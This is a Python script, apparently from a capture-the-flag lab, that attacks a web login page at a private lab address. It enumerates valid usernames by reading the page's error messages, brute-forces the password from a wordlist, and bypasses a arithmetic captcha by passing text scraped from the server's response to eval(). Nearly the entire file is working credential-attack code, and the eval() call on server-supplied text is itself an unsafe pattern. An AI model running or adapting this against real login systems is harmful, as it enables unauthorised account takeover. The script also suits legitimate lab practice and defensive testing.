import requests
import re


def solve_captcha(response):
    regex = re.compile(r"\d+\s[+\-*]\s\d+")
    extract_captcha= re.findall(regex, response.text)[0]
    return eval(extract_captcha)

def findusername(url, username):
    for user in username:
        data = {
            "username": user,
            "password": "testpassword",
            "captcha": ""
        }
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        response = requests.post(url, data=data, proxies=proxies)
        if "does not exist" in response.text:
            continue
        elif "Invalid captcha" in response.text:
            captcha = solve_captcha(response)
            data["captcha"] = captcha
            print(f"Solving Capthca and Capptcha Value is {captcha}")
            new_response = requests.post(url, data=data, proxies=proxies)
            if "does not exist" in new_response.text:
                continue
            else:
                valid_username = user
                print(f"Username found: {valid_username}")
                break
    return valid_username

def findPassword(url, username, passwords):
    for password in passwords:
        data = {
            "username": username,
            "password": password,
            "captcha": ""
        }
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        response = requests.post(url, data=data, proxies=proxies)
        if "Invalid Password" in response.text:
            continue
        elif "Invalid captcha" in response.text:
            captcha = solve_captcha(response)
            data["captcha"] = captcha
            new_response = requests.post(url, data=data, proxies=proxies)
            if "Invalid Password" in new_response.text:
                continue
            else:
                valid_password = password
                print(f"Password found: {valid_password}")
                break
    return valid_password



def main():
    url = "http://10.10.251.5/login"
    print("[+]Finding Valid UserName")
    with open("usernames.txt", "rt") as fd:
        usernames = fd.read().splitlines()
    with open("passwords.txt", "rt") as fd:
        passwords = fd.read().splitlines()
    
    username = findusername(url, usernames)
    password = findPassword(url, username, passwords)
    # password = findpassword(url, passwords)

    print(f"Found Valid UserName: {username} and Password: {password}")

if __name__ == "__main__":
    main()